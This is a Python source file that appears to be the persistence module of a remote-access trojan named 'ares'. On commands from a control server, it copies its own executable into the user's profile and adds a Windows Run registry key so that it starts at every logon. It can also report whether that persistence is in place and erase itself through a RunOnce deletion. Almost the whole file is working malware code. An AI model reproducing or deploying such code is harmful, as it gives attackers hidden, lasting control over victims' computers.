import os
import sys
import subprocess
import shutil

import server


SERVICE_NAME= "ares"


if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)


def install():
    subprocess.Popen(
        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "%USERPROFILE%\\" + EXECUTABLE_NAME),
                     shell=True)
    shutil.copyfile(EXECUTABLE_PATH, os.path.expanduser("~/%s" % EXECUTABLE_NAME))


def clean():
    subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,
                         shell=True)
    subprocess.Popen(
        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""),
                     shell=True)


def is_installed():
    proc = subprocess.Popen(
        "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output = proc.stdout.read() + proc.stderr.read()
    if SERVICE_NAME in output:
        return True
    else:
        return False


def run():
    operation = server.hello()
    if operation == "install":
        install()
        server.tell('[*] Installed !')
    elif operation == "remove":
        clean()
        server.tell('[*] Removed')
    elif operation == "status":
        if is_installed():
            server.tell('[*] Persistence status: Installed')
        else:
            server.tell('[*] Persistence status: Not installed')
